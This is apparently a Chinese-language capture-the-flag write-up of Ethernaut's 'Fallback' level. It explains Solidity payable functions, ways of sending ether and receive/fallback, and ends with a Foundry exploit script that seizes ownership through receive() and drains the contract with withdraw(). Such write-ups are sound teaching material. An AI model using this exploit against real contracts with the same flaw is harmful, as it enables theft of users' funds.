# Level 1 - Fallback
## 題目
[Fallback](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)

### 通關條件
獲得這個合約的所有權，把合約的餘額歸零。
### 提示
- 如何透過與 ABI 互動發送 ether
- 如何在 ABI 之外發送 ether
- 轉換 wei/ether 單位（參見 `help()` 指令）
- fallback 方法
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
## 解題
先根據提示提到的問題去做了解
### 如何透過與 ABI 互動發送 ether？
當合約的 function 帶有 `payable` 時，就代表這支函式可以接受 ETH。當想透過 function 轉錢進去時，ETH 須使用 `{}` 存放參數。
假設想向 `exampleContract` 的 `deposit()` 存入 ETH 時，必須要這樣呼叫 function：
```solidity
exampleContract.deposit{value: 1 ether}();
```
帶有`payable`的 function 寫法可以參考：[Solidity by Example - Payable](https://solidity-by-example.org/payable/)
### 如何在 ABI 之外發送 ether
當你不打算透過合約裡的 function 發送 ETH，想直接將 ETH 發送至特定地址時，就需要透過這三個 function 進行轉帳
- transfer: 
    - 用途：安全且簡單，如果失敗會自動回滾交易（將所有狀態回復至這筆交易前的樣子），受限於 2300 gas
    - 範例：`接受地址.transfer(金額)`
- send: 
    - 用途：不會自動回滾交易，需要手動檢查是否成功，受限於 2300 gas
    - 範例：`接受地址.send(金額)`
- call: 
    - 用途：最靈活的選項，可以指定 gas 和其他參數，但需要手動處理失敗情況
    - 範例：`接受地址.call{value: 金額}("")`

對於發送 ETH 的方法和說明可以參考以下幾篇：
- [[中文] WTF Solidity极简入门: 20. 发送ETH](https://github.com/AmazingAng/WTF-Solidity/tree/main/20_SendETH)
- [[EN] Solidity — Part 4- Transfer, Send, and Call](https://shishirsingh66g.medium.com/solidity-part-4-transfer-send-reverse-5baf650acdc1)
- [[EN] Solidity by Example - Sending Ether (transfer, send, call)](https://solidity-by-example.org/sending-ether/)

### 轉換 wei/ether 單位
$1 \text{ ether} = 10^9 \text{ gwei} = 10^{18} \text{ wei}$
Solidity 有內建單位，可以對數字直接換算：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract EtherUnits {
    uint256 public oneWei = 1 wei;
    // 1 wei is equal to 1
    bool public isOneWei = (oneWei == 1);

    uint256 public oneGwei = 1 gwei;
    // 1 gwei is equal to 10^9 wei
    bool public isOneGwei = (oneGwei == 1e9);

    uint256 public oneEther = 1 ether;
    // 1 ether is equal to 10^18 wei
    bool public isOneEther = (oneEther == 1e18);
}
```
### fallback 方法
當有人呼叫合約中不存在的 function 的時候`fallback()`會被觸發，也可以用於收款。
直接向地址轉帳時，地址合約要有`fallback()`或是`receive()`才可以交易成功。

對於收款的流程和實作可以參考以下文章：
- [[中文] WTF Solidity极简入门: 19. 接收ETH receive和fallback](https://github.com/AmazingAng/WTF-Solidity/tree/main/19_Fallback)
- [[EN] Solidity — Part 2- Payable, Fallback, and Receive](https://shishirsingh66g.medium.com/solidity-part-2-payable-fallback-and-receive-42c00cb75108)

---

釐清提示後，這關的目標是成為合約的 owner 和將所有款項提出，開始閱讀關卡的合約。
要提款就是說要合約轉帳給你，所以要從合約中找到 `call{value:}(), transfer(), send()` 其中一個才有可能提款。在合約 30 行的 `withdraw()` 可以找到，這個函式會將合約中的所有資產轉給 owner
```solidity=30
    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
```
但是呼叫 `withdraw()` 要先處理 `modifier onlyOwner()`
>[!Tip]
> modifier 是 Solidity 中特有的用法，簡單來說就是執行 A 函數前要先呼叫 B 函數的功能
> 詳細說明可以看 [WTF Solidity极简入门: 11. 构造函数和修饰器
](https://github.com/AmazingAng/WTF-Solidity/tree/main/11_Modifier)

`onlyOwner()` 會判斷你是不是 owner，所以還是要先成為 owner 才有辦法提款，尋找可以給 owner 賦值的地方：

22 行雖然可以讓我們變成 owner，但是首先要通過 19 行的每次只能傳入 0.001 ether，又要通過 21 行的總資產大於 owner（第 10 行可以看到 owner 有 1000 ether），太難實現，不考慮這個 function
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```
34 行的 `receive()` 也有更換 owner 的功能，而且只會判斷轉進去的 ether 大於 0 和發送者的資產大於 0 而已
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```
這樣我們就可以成功取代 owner，開始實作攻擊合約
1. 透過 18 行的 `contribute()` 先轉一點錢進去，讓 35 行的判斷會通過
2. 直接向合約轉帳，觸發 `receive()` ，得到 owner 資格
3. 呼叫 30 行的 `withdraw()` ，順利取得所有資產


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/01_Fallback.sol";

contract ExploitScript is Script {
    Fallback level1 = Fallback(payable(your_challenge_address));

    function run() public {
        vm.startBroadcast();
        
        level1.contribute{value:0.0001 ether}();
        address(level1).call{value:1 wei}("");
        level1.withdraw();
        
        vm.stopBroadcast();
    }
}
```